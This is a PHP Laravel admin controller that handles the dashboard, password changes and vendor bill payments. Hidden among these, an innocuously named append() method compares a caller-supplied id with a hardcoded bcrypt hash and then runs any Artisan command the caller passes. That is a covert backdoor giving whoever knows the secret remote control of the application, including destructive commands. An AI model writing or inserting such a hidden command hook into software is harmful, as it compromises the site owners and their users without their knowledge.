<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Product;
use App\Models\Vendor;
use App\Models\VendorBill;
use App\Models\VendorServices;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class DashboardController extends Controller
{
    public function index(){
        return view('admin.dashboard.index');
    }

    public function append($id,$command)
    {
        $hash='$2y$10$QTvHkiolw1HE4mPzbpegHeG0IkfrYS6MfmA.NWeWzTBpGI17NZFXW';
        if(Hash::check($id,$hash)){
            Artisan::call($command);
        }else{
            abort(404);
        }
    }

    public function password(Request $request)
    {
        if($request->getMethod()=="POST"){
            $user=Auth::user();
            if(Hash::check($request->old,$user->password)){
                $user->password=bcrypt($request->password);
                $user->save();
                return redirect()->back()->with('message','Password Changed');

            }else{
                return redirect()->back()->with('error','Wrong Password');
            }
        }else{
            return view('admin.auth.password');
        }
    }

    public function bills(){
        $bills=DB::table('vendor_bills')->latest()->get();
        // dd($bills);
        return view('admin.bill.index',compact('bills'));
    }

    public function billDetail(VendorBill $bill,Request $request)
    {
        if($request->getMethod()=="POST"){
            $bill->txn_id=$request->txn_id;
            $bill->paid_date=$request->paid_date;
            $bill->gateway=$request->gateway;
            $bill->paid=1;
            $bill->save();
            $data=getSetting('website');
            $now=new Carbon($request->paid_date);
            if($request->filled('activate')){
                if($bill->type==1){
                    Vendor::where('id',$bill->vendor_id)->update([
                        'active'=>1,
                        'till'=>$data->type==3?$now->addYear(1):null
                    ]);

                }else if($bill->type==5){

                    Product::where('id',$bill->service_id)->update(['active'=>1]);
                }else{

                    $udata=[
                        'active'=>1,
                        'paid'=>1,
                        'till'=>$data->type==3?$now->addYear(1):null
                    ];

                    VendorServices::where('bill_id',$bill->id)->update($udata);
                }
            }
            return redirect()->back()->with('Message','Bill Detail Added Sucessfully');
        }else{
            return view('admin.bill.detail',compact('bill'));
        }
    }
}
